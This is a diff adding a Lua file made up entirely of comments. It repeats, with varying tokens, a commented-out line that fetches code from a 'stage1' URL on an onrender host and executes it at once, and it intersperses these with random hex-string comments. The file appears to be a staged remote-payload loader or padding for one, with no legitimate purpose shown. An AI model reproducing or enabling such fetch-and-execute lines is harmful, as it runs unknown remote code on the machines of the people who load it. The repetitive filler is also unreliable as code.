@@ -1,0 +1,3015 @@
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_2c3ce580bc7ab6f7", true))()
+--[[ _e92a55712909ce3d653753fa7b3c7a1f ]]
+--[[ _122c64852120d590f78d8389a721f4c9 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_b32b1ed93e95b11c", true))()
+--[[ _d5f51dc177f5ad6a21d6304002e1b965 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_1c92520d7009b320", true))()
+--[[ _421cdefe9ea0c3be3bcbc63989c5a5b4 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_3b1f7b98cdef1479", true))()
+--[[ _3e6fec3fc2fd8bce92fbedfbcbec6ce9 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_83d623cb2d26da75", true))()
+--[[ _252a63bea74f4af35319af031f157eb6 ]]
+--[[ _0eda72da796a36a776af0647d4523302 ]]
+--[[ _89cc58c775206494c6fb39159d187125 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_f3a347dab53285ed", true))()
+--[[ _8a742311e0c88ab8ff955f848d6d6b2f ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_c3cf4e6365be6352", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_116b6a5f03ae456a", true))()
+--[[ _64b759f42a5cc567444ff13dac820940 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_1c60be0cca95656f", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_0e37fc9d79407f7c", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_752b31683271fc2f", true))()
+--[[ _92297af841001987225c56ac5d792913 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_ae87d6af227ac4cc", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_0217ac3e45212801", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_ac1c529ee2bd59ec", true))()
+--[[ _450f74b8254b71db439a928556169e94 ]]
+--[[ _d4ca66a866fa8416efcdc53dc6a99c9b ]]
+--[[ _f867f97f5be361ae68dff57c13400fec ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_cf6481ac05e30f2a", true))()
+--[[ _b80562a66c659e240bb42055206db41a ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_3358ea00ae785abf", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_e1b7476d192b538b", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_57e7d8f6717f8328", true))()
+--[[ _06b89dafbf40c109bf86975823cc1ad1 ]]
+--[[ _a91582e13b25991d9efc30f0f46b7186 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_bfd3b58a6fb1a364", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_e55a8d4c9a5e3b26", true))()
+--[[ _a0ba0d2b37aad5b175c7a0c05a850ca4 ]]
+--[[ _b50f2f1a2810076d674ea3524c1e2003 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_b81b6cbcfdfea907", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_797be1440336016e", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_6484bc1830288526", true))()
+--[[ _b61ec9f4b7631de49314ac27ed44dcdf ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_2407e082a4a6b7a1", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_5cad58bc2b110050", true))()
+--[[ _6704d6fe9c17940e012c56f77ceef263 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_0c638ed5c708eace", true))()
+--[[ _6a781ea59df5964f8b0d4eca7f305a40 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_c03805134c91a731", true))()
+--[[ _f08c892104efe68c30aa57ec7c5548e5 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_fea29092e3662f51", true))()
+--[[ _c41365a2317a5ffe12821edc123c78af ]]
+--[[ _b65f15c68afc97060fe1acb80829aae8 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_b97d9671f1f9a8f8", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_17a0e7ff9d0c9c0f", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_e29cf9a50a68e918", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_ea071aa83a1efa9e", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_37b7b69101c055f5", true))()
+--[[ _86b40f7398eeb45711e96efd82372029 ]]
+--[[ _c986e09f5b95553e38f8c294ec54ab2b ]]
+--[[ _27c854c479d88b23a6f952fadc466654 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_2a11754a109af1b6", true))()
+--[[ _d82fc285eac6960225dd00bde21edf18 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_2e3153f0c8d2797a", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_ba343e87ee9ae067", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_d12b1cd945f31435", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_1fe76113a395e9f2", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_25d10992f41af38b", true))()
+--[[ _1d8faab1d7e200c09833e19b43dbbc55 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_82b10f705ca2e806", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_67422d2701f01824", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_8eb55c08feb5127c", true))()
+--[[ _22939812f2bd8ce816be886b47d212ec ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_0211c81a6098555f", true))()
+--[[ _dcfa2107727ceb53be3eb822ebf070dd ]]
+--[[ _f3554cc10f7a1d597ed54e97c246923a ]]
+--[[ _7a61190f4e7c0445a48029f58762d2ba ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_42253e12b998b5dd", true))()
+--[[ _ecf3874dc2974356850cc0b3b8810f0a ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_78761a83b75ba808", true))()
+--[[ _8d046230157dd7ec452302d760a64ca8 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_0d0f41aa2d7f0770", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_e82632b085e11e33", true))()
+--[[ _f40ac36f8d96ac6f86b35f3fe68a61a5 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_0316a42af9564b13", true))()
+--[[ _c352b555e902be028f9930fcda974652 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_42b8bc9633ac402e", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_e8e2dc00e541d34a", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_106143eda5d1cb4e", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_95e2b63f353c1085", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_4f5c11297208b3ba", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_a7cec3990bc3490a", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_e95486e36f95f577", true))()
+--[[ _010b586a5418cc52d77ecaef58e65f14 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_6d55688e793ffdab", true))()
+--[[ _1c7fb2944bbb4002e46a2b6da11e4e75 ]]
+--[[ _cd7c8116ab7bf1e1ccb6485a2d024440 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_87fb8ce8e9603649", true))()
+--[[ _1f823ee391cab1862a2de2ac09e19a87 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_0709afa1763da1b8", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_ed30e6b108f0ba47", true))()
+--[[ _e6c8ca49bbc66f3f8370e2460656370e ]]
+--[[ _02094247354a14a64fb2cee9298bd2a9 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_7b443a794eab72cd", true))()
+--[[ _8c6aedbe97d29453124ea2b1550f637e ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_9f22db4e2af5b09f", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_2799493a8f8aa15c", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_14fa019f17c40c9f", true))()
+--[[ _a8ec56e8b494a07d82e9175960b492ce ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_10179ee0e1d5d529", true))()
+--[[ _bfdf4b26475330019b3b89b9cd3916cc ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_f2d3c80bc9113383", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_7ccafcfae849e255", true))()
+--[[ _8a8df49d263a907cd1bed777e43014e5 ]]
+--[[ _6f2a73256727fc2677f9f8de86e89bc0 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_9e5c4cb6c9b84c26", true))()
+--[[ _dfeca1820d48cf704a8a118af8fc979c ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_e04d8e5347410f7d", true))()
+--[[ _7a3610109bae2e4dc4073e24e1a43d7d ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_753eac0dc317f3a4", true))()
+--[[ _1801bb3b24e5feb0ecde615783cd0307 ]]
+--[[ _afa3c573e0736681561f32b1b53f4491 ]]
+--[[ _b7bdf71876d080a373bb584171a20ee7 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_43644543af8bb133", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_a4b34bafc329cb00", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_8d2fcc3bb25585fe", true))()
+--[[ _8cb7f6a2809d4266caec96f26f79c6d6 ]]
+--[[ _5a363f1ad354596b90581f065c932397 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_a970a05ce6f70063", true))()
+--[[ _eed3f8db509fba8ecb99fe4bf94d1c82 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_dd845c71d36af752", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_3839a2143a758cf9", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_94534d41c2955131", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_5dae94843bccc440", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_d394e950c2769c02", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_a3b1d00ece6c902b", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_480377ec419afe96", true))()
+--[[ _b223074ea3dac96a5dc23b8fb329f108 ]]
+--[[ _2ceef6a404ff610a968da0e0bf9451a2 ]]
+--[[ _d1cec959932ea86897ffac0490e05245 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_255c16b17a052a24", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_77ef8bc790b1e4f6", true))()
+--[[ _b7d59c3a816928096b20410a31dbeab2 ]]
+--[[ _a9565f2479efb3bc17f5ec778552bbf5 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_2c308eb76aa78ed6", true))()
+--[[ _f0c2ddda57d513a8d58cb7987b3d89cf ]]
+--[[ _05099a9dac42873ee01efc325d673718 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_3757449e9170ce1c", true))()
+--[[ _a7e3d0e8ccc3a112177f16a873ad157a ]]
+--[[ _4899c4a56296fb1e39e826a83a34d64f ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_bc0622f68a95b10e", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_a971d5129f429773", true))()
+--[[ _bd201fee522861b061b5fa3bc567763b ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_8740de35bf63a2dc", true))()
+--[[ _7cba7b8a9a7ce9bd9ff7bfc2d230ddb9 ]]
+--[[ _f7404137819070bc4e56552f5fa8a6f6 ]]
+--[[ _3e315be41bdb0720401d0f3a11add23e ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_5c4ad2f5262f5fb0", true))()
+--[[ _121a294d07bfb7ef155fe46b6a68e656 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_985419b1ec822f27", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_607dbe2bf7f5566f", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_3056c0a4e4f82cb5", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_325da3e9ae06ace8", true))()
+--[[ _fc28b5e36dbdc10c763edb41614fff07 ]]
+--[[ _87dfd89ffd9c43b5d5177285160e18cd ]]
+--[[ _005e6e8147119807f66cf0409eec4931 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_60826712fb7f849e", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_d79d1c33c4df9252", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_1f568e597f721da7", true))()
+--[[ _dc419cbb8a7f6c1a0184caf2440113c2 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_34b76c567b932f63", true))()
+--[[ _68d79bcd8a128338c34580a816941a32 ]]
+--[[ _01a65a96ee8a434fb4c860281070133f ]]
+--[[ _176e8eddf9d199d0c4aff08001181be1 ]]
+--[[ _9ee2d4795e4226e0d7830ca90ff03221 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_62f0a27d8f823120", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_43a31851f73d373b", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_951bbc42ee9bd524", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_3e585df6aa26ab54", true))()
+--[[ _ea49608b2175abe8fc31b84c9c5e6776 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_377de34287ba350b", true))()
+--[[ _0d2ba10fbdf687033ea7725810e23ccf ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_f0eeee0b85721705", true))()
+--[[ _620650538f37f06e6a1b600090727024 ]]
+--[[ _be926352d14123c6a74fd749f82b09f9 ]]
+--[[ _38a30a34d04d52ad731470c1b6ff9d94 ]]
+--[[ _543003b19d6b0ceb864edf0993b93fd0 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_2075b901fa3e0f64", true))()
+--[[ _723401222b0b54cc89cebfa7e0ff36ff ]]
+--[[ _cd9dd2344e1a8b23cada177178abdeb3 ]]
+--[[ _dba71424e31c8ac062f4e28cdda0aaa1 ]]
+--[[ _4c0fa28dd721122b8b1da042e544631c ]]
+--[[ _30b61873e435d6708873aa5b3c7efe24 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_6c099624fecfde39", true))()
+--[[ _259413334a6a93296192894a9395fb12 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_4b9606efc3d4fafc", true))()
+--[[ _b72db84494a1c57193c7ac4773cbb8bc ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_07c1086771eeb89c", true))()
+--[[ _707c40f6be900a4dc536be849a2560be ]]
+--[[ _834a08c408c91e98ccc8ca9da6cf2e3b ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_4f411216407f91cd", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_c0680427c6c8bfbf", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_4e9420a4ae250ae1", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_0e656b4ec0705400", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_f57cdca4b52febac", true))()
+--[[ _4b19d0daec1845ebdaf4f4537e5e2bdb ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_ef484f21d6fae4df", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_fe9a8ebfe9a8131a", true))()
+--[[ _4400b5464d75c60676390dbc7879e677 ]]
+--[[ _c29c33b3cc23853a1c3dfd88a6f2286a ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_99a7ab86fd242b0d", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_9c507a4987f3db4b", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_c436d01056d89004", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_4c301689dd573a4c", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_4d9f4cf89cc2c25f", true))()
+--[[ _3820c78dce2c46c5f2fb0f6849115e3b ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_53694d76fb45bd72", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_47892f68683c7b9b", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_e89b98643c47e10c", true))()
+--[[ _6660fab740b56996791ce6a4319aa3bf ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_62f25f7243e4f371", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_5fac4e5ab4820869", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_09cffb1dce73480f", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_1f3448190fb84786", true))()
+--[[ _c27d1e45f1f3a32600edc010bdf2e669 ]]
+--[[ _1079d14b50db9ae4b06938bee6330500 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_cea1fb31b43e72f5", true))()
+--[[ _f72c6a2e8f15e8aa931629bd7ee070fc ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_c9b35f6b9c4d4fb7", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_be4fcbef6fdf4178", true))()
+--[[ _e65c924ce42c10a84138b2391bb4633e ]]
+--[[ _ba7176a2eb4894f62490b2e4da1176b7 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_bde4b3138bfeeb28", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_40ed97c5bfbf17e1", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_9c104a925c4b913b", true))()
+--[[ _ae88a6fe670290d8848913bf6e9565d5 ]]
+--[[ _4d9bd4238f649ce8d5547f375ee35c0c ]]
+--[[ _1d83e435ee19d910f71d10cb45ae2c81 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_1236abcaedeef473", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_6732be32bf420803", true))()
+--[[ _74c3455eeadacb099fa2407a7dbac239 ]]
+--[[ _2c51e60e12163c74891e086cc7a4c717 ]]
+--[[ _c44f4289895df54368ff816c698634a4 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_47ec09ad2434b5d9", true))()
+--[[ _6828fe60661b577eb3b45d119ec679db ]]
+--[[ _9cc05742539fd636937c37af133d96d5 ]]
+--[[ _4fcbf6a6f137b6853b9d11858f4d2f45 ]]
+--[[ _73dd90711f30b45949e7942621cde9fd ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_2024651328198dd1", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_72bd877c02d6d415", true))()
+--[[ _71c94dedb4dc8452a0a3a36703f9ac9f ]]
+--[[ _d4443274a782a4e4405938b8f4565b93 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_a04f0dd5b067cb01", true))()
+--[[ _a9bdc4334fddb92c93787df399f914a1 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_a38bec3066c9c767", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_fccb077a8733cad0", true))()
+--[[ _1b5ab99b48b49292437184f97fa60d9e ]]
+--[[ _83a356c4be45417298a765447631480b ]]
+--[[ _84cbcc88dcb843ad1187bb0e64a714bf ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_8d3b280a8749a8bd", true))()
+--[[ _6c010d5c78e75c92b4e8c037fd91900c ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_cd45cb1c57ada388", true))()
+--[[ _eddd684748fd61ef42e9b3d2fd790fb5 ]]
+--[[ _dac20068d6820cb11e01de62b61aed31 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_6add74d02567bc99", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_65a73061642deba4", true))()
+--[[ _666bac36bac9eaac0e10e7765db75aa1 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_e103255e3365b09c", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_d04d5dbf1a6da9d8", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_66949e6f0734dfd1", true))()
+--[[ _eabcd1b2b46a4b7aa23a6aaab0536224 ]]
+--[[ _74350f17fef50fd1db5c8caa17d15f66 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_88e57d6866ae5ddd", true))()
+--[[ _ae6d6f2fec58f8b28f54cd1c0ba5a2f3 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_89712dbf78ae6f73", true))()
+--[[ _08263efb786db268fd881230ffbcb031 ]]
+--[[ _d83806821f3a7f6f5923cbb369cfbd49 ]]
+--[[ _1653a6da450e711c28f8617aceb67a5a ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_0a3076efe9e0a4e7", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_0366dea6f66bfcdc", true))()
+--[[ _1041bb95499a336606a05de2691a843f ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_7650b14d08622a3d", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_198db0d7a6c7ad3d", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_1c3dc3aef70898a1", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_f82f2bbb760decde", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_2d97cfc1adc30b7d", true))()
+--[[ _ce1c7e819f143153b553ab5abc9d9b64 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_49cd00f4b7c6a805", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_ee93c858f80165e0", true))()
+--[[ _da6741799f9804dc7a6e97cf91b94782 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_67a6e7feef09e1dd", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_033db2211db33334", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_099263c97b763bbf", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_61c922586f0dae45", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_14fca6af41762a95", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_4fed28cee641451a", true))()
+--[[ _aac6c234ee57005ca176598915a0d65f ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_0e5834c875e51fd9", true))()
+--[[ _a7682a63e6348f48163d6eb439a1fbc1 ]]
+--[[ _d2f1c49381ba80762599342b7c3e6924 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_c1211d021da0280f", true))()
+--[[ _5ac70e91cf38d3369cc810868fa74eec ]]
+--[[ _28c7595f765eef7dcf697f2ad1512bdc ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_cc9bec9a4e71fc32", true))()
+--[[ _0a5c0e261dbef5555fa3dd49ace4b65f ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_5a2dcf121438f7ed", true))()
+--[[ _74345b079c16a362e5b3a30af9ff1e65 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_e0c5df48aad5d0da", true))()
+--[[ _b235b899bfe40564a0aadec00185eef3 ]]
+--[[ _7d1d4cfa09cb27cf9bb784faf56a0ed9 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_64214268651d8838", true))()
+--[[ _2b17fe590130a7f44b54792a038e1fff ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_4415f9c7728f4ec3", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_5933bd607525ef67", true))()
+--[[ _377827cd5fcfcefc7e13d229bfbe72c1 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_5e6ceb667ecb94a7", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_ce5cda4a00ef722c", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_690b20020bee06c3", true))()
+--[[ _79f6c785529faa179186f59a6425e79a ]]
+--[[ _e25efebbb2add94196162d4b5cf20c61 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_e808497e1117e912", true))()
+--[[ _f668558d25ec25789183ee4d4bbccf98 ]]
+--[[ _b6590efaa544d8ff745da7d74169ca4b ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_3dd3c313352d415c", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_1669d12997330f42", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_2b067716a375662e", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_6817c43a56a6e7e4", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_30ad9bcd192cb64b", true))()
+--[[ _92b352d34ab4bbed4e68b2a7331af53b ]]
+--[[ _39b2b9cc86742333ea6380bbf3478b1d ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_cb47d7ca55079784", true))()
+--[[ _73de689319c2b1f58536f02345808788 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_cd83d754e16a2a7c", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_53f393e69d0b932b", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_086c090a6877baed", true))()
+--[[ _912f81e2acd496a4e83cb822ff041d82 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_7603e58d462f481c", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_a78f8fc85337e3ce", true))()
+--[[ _98b6f102b743493b85a575bc8e3883dd ]]
+--[[ _711be3d7f3660f67531fdf83278e85a7 ]]
+--[[ _7c50b6d36f37ae889bdff51b1d3b73b7 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_37bc74bcc395f124", true))()
+--[[ _123e7be85b6502c08e41876ed0dca1f4 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_da5fcdd653d2181c", true))()
